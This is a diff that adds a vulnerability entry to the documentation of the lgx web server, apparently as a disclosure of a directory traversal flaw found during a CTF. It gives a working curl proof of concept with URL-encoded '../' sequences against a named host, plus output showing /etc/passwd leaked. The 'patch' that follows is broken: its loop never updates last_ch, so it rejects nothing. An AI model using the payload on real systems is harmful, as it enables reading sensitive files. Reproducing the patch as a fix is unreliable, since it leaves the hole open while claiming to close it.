@@ -81,5 +81,51 @@ This attack just take a one minute then make the lgx server break down.
 
 
 
+## LGX-CVE-2020-1125
+
+### Intro
+
+In the AXB 2020 CTF competition, the framework of the server is used to make a pwn challenge. However, the contestants give an unexpected solution. Directory traversal vulnerability can cause any sensitive file to be leaked. This vulnerability is also the vulnerability of lgx server at present.
+
+poc
+
+```
+┌[logan☮arch]-(~)
+└> curl -i "http://i0gan.cn/..%2f..%2f..%2f../etc/passwd"
+HTTP/1.1 200 OK
+Content-Length: 1902
+Access-Control-Allow-Origin: *
+Connection: keep-alive
+Content-Type: obj
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: lgx-linux1.6
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+
+```
+
+### patch
+
+Add a check_file_name function to check traversal vulnerability.
+
+```c++
+bool lgx::net::http::check_file_path(const std::string &file_name) {
+    char last_ch = 0;
+    for (auto ch : file_name) {
+        if(ch == '.')
+            if(last_ch == '.')
+                return false;
+    }
+    return true;
+}
+```
+
 
 
